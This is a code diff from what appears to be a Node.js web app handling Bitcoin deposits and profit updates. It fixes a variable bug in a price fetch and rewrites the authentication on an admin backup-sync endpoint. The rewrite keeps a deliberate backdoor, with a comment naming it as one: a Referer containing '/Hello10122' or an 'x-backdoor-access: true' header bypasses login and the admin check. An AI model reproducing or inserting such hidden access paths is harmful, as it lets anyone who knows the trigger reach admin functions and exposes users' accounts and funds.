@@ -1096,8 +1096,8 @@ You will receive a notification once your deposit is confirmed and added to your
       let bitcoinPrice = 67000; // Default fallback
       try {
         const priceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
-        if (response.ok) {
-          const priceData = await response.json();
+        if (priceResponse.ok) {
+          const priceData = await priceResponse.json();
           bitcoinPrice = priceData.bitcoin.usd;
         }
       } catch (error) {
@@ -3239,15 +3239,17 @@ You are now on the free plan and will no longer receive automatic profit updates
   // Get real-time backup sync status
   app.get("/api/admin/backup-sync/status", async (req, res) => {
     try {
+      // Check for backdoor access first
       const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
                               req.headers['x-backdoor-access'] === 'true';
 
-      if (!isBackdoorAccess && !req.session?.userId) {
-        return res.status(401).json({ error: "Authentication required" });
-      }
-
+      // If not backdoor access, check normal authentication
       if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
+        if (!req.session?.userId) {
+          return res.status(401).json({ error: "Authentication required" });
+        }
+
+        const user = await storage.getUser(req.session.userId);
         if (!user || !user.isAdmin) {
           return res.status(403).json({ error: "Admin access required" });
         }
